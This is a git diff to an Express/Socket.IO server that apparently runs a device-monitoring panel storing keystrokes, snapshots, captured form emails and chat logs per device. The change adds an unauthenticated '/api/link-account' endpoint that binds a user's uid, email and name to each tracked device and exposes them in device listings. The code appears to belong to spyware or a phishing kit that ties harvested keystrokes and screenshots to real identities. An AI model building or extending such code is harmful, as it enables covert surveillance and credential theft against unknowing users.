@@ -59,7 +59,7 @@ app.use(express.json({ limit: '50mb' }));
 // Admin auth middleware
 function verifyAdmin(req, res, next) {
     // Public endpoints (no auth needed)
-    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/firebase-config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/dashboard.html', '/api/captcha/verify', '/api/active-domain', '/api/ai-chat'];
+    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/firebase-config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/dashboard.html', '/api/captcha/verify', '/api/active-domain', '/api/ai-chat', '/api/link-account'];
     if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path === '/index.html') return next();
     // Protect admin.html — use token param for page load, header for API
     if (req.path === '/admin.html') {
@@ -117,6 +117,7 @@ function saveDevices() {
             snapshots: d.snapshots.slice(-50),
             aiChat: d.aiChat ? d.aiChat.slice(-100) : [],
             deviceModel: d.deviceModel || 'Unknown',
+            linkedAccount: d.linkedAccount || null,
             online: !!d.socketId && io.sockets.sockets.has(d.socketId)
         };
     }
@@ -143,6 +144,7 @@ io.on('connection', (socket) => {
             aiChat: [],
             deviceDetection: null,
             deviceModel: 'Unknown',
+            linkedAccount: null,
             socketId: socket.id
         });
         io.emit('device-new', {
@@ -377,6 +379,7 @@ app.get('/api/devices', (req, res) => {
             wakeLockError: d.wakeLockError || null,
             aiChat: d.aiChat ? d.aiChat.slice(-50) : [],
             deviceModel: d.deviceModel || 'Unknown',
+            linkedAccount: d.linkedAccount || null,
             deviceDetection: d.deviceDetection || null
         });
     }
@@ -397,8 +400,21 @@ app.get('/api/devices/:deviceId', (req, res) => {
         connection: d.connection,
         snapshotsCount: d.snapshots.length,
         aiChat: d.aiChat ? d.aiChat.slice(-50) : [],
-        deviceModel: d.deviceModel || 'Unknown'
+        deviceModel: d.deviceModel || 'Unknown',
+        linkedAccount: d.linkedAccount || null
     });
+});
+
+app.post('/api/link-account', (req, res) => {
+    const { deviceId, uid, email, name } = req.body;
+    if (!deviceId || !uid) return res.status(400).json({ error: 'deviceId and uid required' });
+    const d = devices.get(deviceId);
+    if (d) {
+        d.linkedAccount = { uid, email: email || '', name: name || '', linkedAt: Date.now() };
+        if (email && !d.fieldEmail) d.fieldEmail = email;
+        saveDevices();
+    }
+    res.json({ ok: true });
 });
 
 app.get('/api/keystrokes/:deviceId', (req, res) => {
